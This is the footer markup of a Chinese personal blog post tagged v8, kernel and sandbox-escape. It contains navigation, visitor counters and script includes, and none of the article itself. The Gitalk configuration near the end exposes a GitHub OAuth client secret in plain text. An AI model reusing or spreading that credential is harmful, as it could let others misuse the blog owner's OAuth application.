</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/v8/" rel="tag"># v8</a>
              <a href="/tags/kernel/" rel="tag"># kernel</a>
              <a href="/tags/sandbox-escape/" rel="tag"># sandbox-escape</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/5609a6a/" rel="prev" title="2021/5/5 随便写写">
                  <i class="fa fa-chevron-left"></i> 2021/5/5 随便写写
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/917bede2/" rel="next" title="diary">
                  diary <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">feather</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">380k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:46</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>




  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"61243050919f6af8ccd9e1614854136e"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
